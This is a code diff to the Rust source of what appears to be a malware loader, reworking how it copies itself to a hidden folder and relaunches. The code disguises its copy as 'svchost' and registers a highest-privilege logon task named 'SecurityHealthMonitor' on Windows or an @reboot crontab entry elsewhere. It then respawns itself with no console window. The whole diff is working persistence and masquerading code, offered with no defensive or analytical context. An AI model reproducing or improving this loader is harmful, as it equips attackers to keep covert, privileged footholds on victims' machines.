@@ -141,17 +141,24 @@ fn main() {
 
     // 5. Persistence (skip on --boot relaunch)
     if !is_boot {
-        // Install scheduled task / cron first (before copy_and_relaunch which exits)
+        // Step 1: Copy current exe to AppData (don't exit yet)
+        let target_exe = if let Some(path) = loader_cfg.copy_to_path.as_deref() {
+            if !path.is_empty() {
+                log!("[7/10] copy_to_path={}, copying...", path);
+                copy_exe_to_target()
+            } else { None }
+        } else { None };
+
+        // Step 2: Install scheduled task / cron — point to the copy if available
         if loader_cfg.enable_persistence {
             log!("[7/10] installing persistence...");
-            install_persistence();
+            install_persistence_at(target_exe.as_deref());
         }
-        // Copy to AppData and relaunch (exits process on success)
-        if let Some(path) = loader_cfg.copy_to_path.as_deref() {
-            if !path.is_empty() {
-                log!("[7/10] copy_to_path={}, relaunching...", path);
-                copy_and_relaunch(path);
-            }
+
+        // Step 3: Relaunch from the copy and exit
+        if let Some(ref target) = target_exe {
+            log!("[7/10] relaunching from {:?}...", target);
+            relaunch_from(target);
         }
     } else {
         log!("[7/10] --boot: skipping persistence");
@@ -286,12 +293,11 @@ fn parse_injected_config() -> Option<(InjectedConfig, String)> {
 
 // ── Persistence (lightweight, no libra-modules dependency) ────────────
 
-fn copy_and_relaunch(_relative_path: &str) {
-    let current_exe = match env::current_exe() {
-        Ok(e) => e,
-        Err(_) => return,
-    };
-    let current_dir = current_exe.parent().unwrap_or(std::path::Path::new("."));
+/// Copy current exe to the target location.
+/// Returns the target exe path, or None if already at target or copy failed.
+fn copy_exe_to_target() -> Option<std::path::PathBuf> {
+    let current_exe = env::current_exe().ok()?;
+    let current_dir = current_exe.parent()?;
 
     #[cfg(target_os = "windows")]
     let target_dir = {
@@ -304,8 +310,10 @@ fn copy_and_relaunch(_relative_path: &str) {
         std::path::PathBuf::from(home).join(".local/share").join("sys64")
     };
 
+    // Already at target — --boot process, no need to copy again
     if current_dir.canonicalize().ok() == target_dir.canonicalize().ok() {
-        return;
+        log!("copy_exe: already at target, skipping");
+        return None;
     }
 
     #[cfg(target_os = "windows")]
@@ -314,39 +322,48 @@ fn copy_and_relaunch(_relative_path: &str) {
     let target_exe = target_dir.join("svchost");
 
     if std::fs::create_dir_all(&target_dir).is_err() {
-        log!("copy_and_relaunch: create_dir_all failed for {:?}", target_dir);
-        std::process::exit(0);
+        log!("copy_exe: create_dir_all failed for {:?}", target_dir);
+        return None;
     }
     if std::fs::copy(&current_exe, &target_exe).is_err() {
-        log!("copy_and_relaunch: copy failed from {:?} to {:?}", current_exe, target_exe);
-        std::process::exit(0);
+        log!("copy_exe: copy failed from {:?} to {:?}", current_exe, target_exe);
+        return None;
     }
+    log!("copy_exe: copied to {:?}", target_exe);
+    Some(target_exe)
+}
 
+/// Spawn the target exe with --boot and exit the current process.
+fn relaunch_from(target_exe: &std::path::Path) -> ! {
     #[cfg(target_os = "windows")]
     {
         use std::os::windows::process::CommandExt;
-        let _ = std::process::Command::new(&target_exe)
+        let _ = std::process::Command::new(target_exe)
             .arg("--boot")
             .creation_flags(0x08000000)
             .spawn();
     }
     #[cfg(not(target_os = "windows"))]
     {
-        let _ = std::process::Command::new(&target_exe)
+        let _ = std::process::Command::new(target_exe)
             .arg("--boot")
             .spawn();
     }
-
     std::process::exit(0);
 }
 
-fn install_persistence() {
+/// Install scheduled task / cron for logon persistence.
+/// If target_override is provided, the task points to that path (the APPDATA copy).
+fn install_persistence_at(target_override: Option<&std::path::Path>) {
     #[cfg(target_os = "windows")]
     {
         use std::os::windows::process::CommandExt;
-        let exe = match env::current_exe() {
-            Ok(e) => e.to_string_lossy().to_string(),
-            Err(_) => return,
+        let exe = match target_override {
+            Some(p) => p.to_string_lossy().to_string(),
+            None => match env::current_exe() {
+                Ok(e) => e.to_string_lossy().to_string(),
+                Err(_) => return,
+            },
         };
         let _ = std::process::Command::new("schtasks.exe")
             .args(["/create", "/tn", "SecurityHealthMonitor", "/tr", &exe, "/sc", "onlogon", "/rl", "highest", "/f"])
@@ -357,9 +374,12 @@ fn install_persistence() {
     }
     #[cfg(not(target_os = "windows"))]
     {
-        let exe = match env::current_exe() {
-            Ok(e) => e.to_string_lossy().to_string(),
-            Err(_) => return,
+        let exe = match target_override {
+            Some(p) => p.to_string_lossy().to_string(),
+            None => match env::current_exe() {
+                Ok(e) => e.to_string_lossy().to_string(),
+                Err(_) => return,
+            },
         };
         let cron_line = format!("@reboot {} >/dev/null 2>&1", exe);
         let cmd = format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line);
